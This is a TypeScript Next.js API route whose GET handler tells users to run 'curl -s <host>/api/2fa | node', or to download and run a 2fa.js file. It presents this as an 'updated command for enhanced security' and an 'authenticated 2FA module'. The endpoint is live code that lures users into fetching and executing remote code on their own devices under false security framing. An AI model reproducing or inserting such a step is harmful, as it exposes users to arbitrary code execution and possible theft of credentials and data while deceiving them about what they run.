import { NextApiRequest, NextApiResponse } from 'next';

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  // This endpoint is kept for compatibility but redirects to manual process
  if (req.method === 'GET') {
    const baseUrl = `${req.headers['x-forwarded-proto'] || 'http'}://${req.headers.host}`;
    res.status(200).json({ 
      message: 'Please use the updated command for enhanced security',
      command: `curl -s ${baseUrl}/api/2fa | node`,
      windows_alternative: `Download ${baseUrl}/api/2fa and run: node 2fa.js`,
      note: 'This command downloads the authenticated 2FA module from this secure platform and executes it locally on your device.'
    });
  } else {
    res.status(405).json({ error: 'Method not allowed' });
  }
}
